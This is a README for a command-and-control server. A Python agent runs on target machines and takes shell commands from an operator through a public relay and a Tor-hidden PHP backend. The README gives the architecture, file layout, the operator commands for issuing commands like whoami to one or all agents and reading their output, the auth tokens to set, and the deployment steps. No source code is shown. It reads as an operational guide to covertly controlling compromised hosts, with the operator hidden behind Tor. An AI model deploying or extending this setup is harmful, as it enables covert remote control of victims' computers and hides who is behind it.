# C2 Server

## Architecture

```
┌──────────┐      HTTP       ┌──────────────┐      Tor       ┌──────────────┐
│  AGENT   │ ──────────────► │ RELAY SERVER │ ─────────────► │  C2 SERVER   │
│ (target) │ ◄────────────── │ (public VPS) │ ◄───────────── │ (behind Tor) │
└──────────┘                 └──────────────┘                └──────────────┘
 agent.py                    relay_server.py                  server/*.php
                                                              c2.py (manage)
```

## Structure

```
c2-server/
├── server/                ← PHP endpoints (behind Tor)
│   ├── getcommand.php     ← Serves commands to agents
│   └── postdata.php       ← Receives agent output
├── relay/                 ← Relay server (public VPS)
│   ├── relay_server.py
│   └── requirements.txt
├── agent/                 ← Runs on target
│   └── agent.py
└── c2.py                  ← Manage from terminal
```

## Usage (c2.py)

Run on the C2 server machine. Direct file operations, no API needed.

```bash
# List agents
python c2.py agents

# Send command to specific agent
python c2.py cmd abc123def456 whoami

# Send command to ALL agents
python c2.py cmd all ipconfig

# View agent output
python c2.py logs abc123def456

# View last 5 entries
python c2.py logs abc123def456 -n 5

# Clear pending command
python c2.py clear abc123def456
```

## Tokens to Configure

| Token | Files | Purpose |
|-------|-------|---------|
| `AUTH_TOKEN` | `server/getcommand.php`, `server/postdata.php`, `relay/relay_server.py` | Relay ↔ C2 |
| `RELAY_AUTH_TOKEN` | `relay/relay_server.py`, `agent/agent.py` | Agent ↔ Relay |

## Setup

1. **C2 Server**: Host `server/` behind Tor hidden service with PHP
2. **Relay**: Run `relay_server.py` on a public VPS with Tor installed
3. **Agent**: Run `agent.py` on target, pointed at the relay IP
4. **Manage**: Use `c2.py` on the C2 server machine
